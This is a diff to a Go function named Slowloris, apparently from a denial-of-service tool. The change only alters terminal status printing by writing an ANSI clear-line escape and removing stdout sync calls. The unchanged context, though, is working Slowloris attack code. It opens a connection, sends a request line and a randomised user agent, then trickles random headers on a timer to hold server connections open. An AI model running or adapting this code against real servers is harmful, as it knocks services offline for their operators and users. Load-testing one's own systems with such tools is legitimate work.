@@ -35,7 +35,9 @@ func Slowloris(ctx context.Context, index int64, options Options) error {
 
 	// send HTTP GET request line
 	getRequest := GetRequestLine(url.Path)
-	fmt.Printf("\rslowloris(%d): sending request line (%s)^[[2K", index, getRequest)
+	fmt.Printf("\rslowloris(%d): sending request line (%s)", index, getRequest)
+	os.Stdout.Write([]byte("\033[2K"))
+
 	line := httpLine(getRequest)
 	n, err := conn.Write([]byte(line))
 	if err != nil || n < len(line) {
@@ -47,14 +49,14 @@ func Slowloris(ctx context.Context, index int64, options Options) error {
 	if userAgent == "random" {
 		userAgent = fake.UserAgent()
 	}
-	fmt.Printf("\rslowloris(%d): sending user agent (%s)^[[2K", index, userAgent)
+	fmt.Printf("\rslowloris(%d): sending user agent (%s)", index, userAgent)
+	os.Stdout.Write([]byte("\033[2K"))
+
 	line = httpLine(Header("User-Agent", userAgent))
 	n, err = conn.Write([]byte(line))
 	if err != nil || n < len(line) {
 		return err
 	}
-
-	os.Stdout.Sync()
 
 	interval := options.Interval
 	for {
@@ -63,15 +65,14 @@ func Slowloris(ctx context.Context, index int64, options Options) error {
 			return nil
 		case <-time.After(interval):
 			header := RandomHeader()
-			fmt.Printf("\rslowloris(%d): send header (%s)^[[2K", index, header)
+			fmt.Printf("\rslowloris(%d): send header (%s)", index, header)
+			os.Stdout.Write([]byte("\033[2K"))
 			line = httpLine(header)
 			n, err := conn.Write([]byte(line))
 			if err != nil || n < len(line) {
 				return err
 			}
 		}
-
-		os.Stdout.Sync()
 	}
 }
 
